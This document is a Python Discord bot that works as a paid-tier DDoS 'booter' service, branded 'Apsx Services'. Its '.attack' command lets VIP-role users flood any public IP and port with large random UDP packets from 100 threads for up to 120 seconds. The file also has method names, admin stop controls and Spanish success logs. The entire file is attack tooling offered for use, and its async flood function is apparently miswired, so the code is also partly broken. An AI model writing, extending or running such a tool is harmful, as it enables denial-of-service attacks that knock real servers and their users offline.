import discord
from discord.ext import commands
import threading
import socket
import time
import json
import re
import os
import asyncio
from concurrent.futures import ThreadPoolExecutor

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='.', intents=intents)

VALID_METHODS = [
    "UDP-VSE", "UDPGOOD", "UDPRAW", "UDPGAME",
    "UDPHEX", "MCPE", "TCPBYPASS", "UDPBYPASS"
]

MAX_THREADS = 100
PAYLOAD_SIZE = 65500
attack_threads = []

def is_valid_public_ipv4(ip):
    try:
        parts = list(map(int, ip.split('.')))
        if (
            len(parts) != 4 or
            any(p < 0 or p > 255 for p in parts) or
            parts[0] in (10, 127) or
            (parts[0] == 192 and parts[1] == 168) or
            (parts[0] == 172 and 16 <= parts[1] <= 31)
        ):
            return False
        socket.inet_aton(ip)
        return True
    except:
        return False

async def perform_attack(ip, port, duration, method):
    timeout = time.time() + duration
    payload = os.urandom(PAYLOAD_SIZE)

    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (ip, port))
                sock.close()
            except:
                pass
            time.sleep(0.01)

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(flood) for _ in range(MAX_THREADS)]
        for f in futures:
            f.result()

def stop_all_attacks():
    for thread in attack_threads:
        if thread.is_alive():
            try:
                thread._stop()
            except:
                pass

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def dhelp(ctx):
    await ctx.send(
        "**Available Commands:**\n"
        "`.dhelp` - Show help\n"
        "`.methods` - List available methods\n"
        "`.attack <ip> <port> <method> <time>` - Execute attack (VIP only)\n"
        "`.stopall` - Admin only command to stop all attacks"
    )

@bot.command()
async def methods(ctx):
    await ctx.send("**Available Methods:**\n" + "\n".join(VALID_METHODS))

@bot.command()
async def attack(ctx, ip=None, port=None, method=None, time_sec=None):
    if not all([ip, port, method, time_sec]):
        await ctx.send("Usage: `.attack <ip> <port> <method> <time>`")
        return

    if not any(role.name == "VIP" for role in ctx.author.roles):
        await ctx.send("Access denied. VIP role required.")
        return

    if not is_valid_public_ipv4(ip):
        await ctx.send("Invalid or private IP address.")
        return

    try:
        port = int(port)
        time_sec = int(time_sec)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        await ctx.send("Port must be a number (1–65535) and time must be numeric.")
        return

    if method.upper() not in VALID_METHODS:
        await ctx.send("Invalid method. Use `.methods` to see valid ones.")
        return

    if time_sec > 120:
        await ctx.send("Max time allowed is 120 seconds for VIPs.")
        return

    await ctx.send(f"**Launching attack...**\n`{ip}:{port}`\n**Method:** `{method.upper()}`\n**Time:** `{time_sec}s`\n**Threads:** {MAX_THREADS}")

    await asyncio.to_thread(perform_attack, ip, port, time_sec, method)

    attack_data = {
        "status": "success",
        "message": "Ataque enviado con éxito",
        "attack_log": {
            "username": str(ctx.author),
            "service": "Apsx Services",
            "host": ip,
            "port": port,
            "time": f"{time_sec} segundos",
            "method": method.upper(),
            "handlers": "Node (4), Node (1)"
        }
    }

    await ctx.send("```json\n" + json.dumps(attack_data, indent=4) + "\n```")
    await ctx.send("**Ataque terminado con éxito.**")

    log_filename = f"{ctx.channel.id}.log"
    with open(log_filename, "a") as f:
        f.write(json.dumps(attack_data, indent=4) + "\n\n")

@bot.command()
async def stopall(ctx):
    if not any(role.name == "Admin" for role in ctx.author.roles):
        await ctx.send("Access denied. Admin role required.")
        return
    stop_all_attacks()
    await ctx.send("All running attacks have been stopped.")

# Reemplaza con tu token de bot real
bot.run("YOUR_DISCORD_BOT_TOKEN")
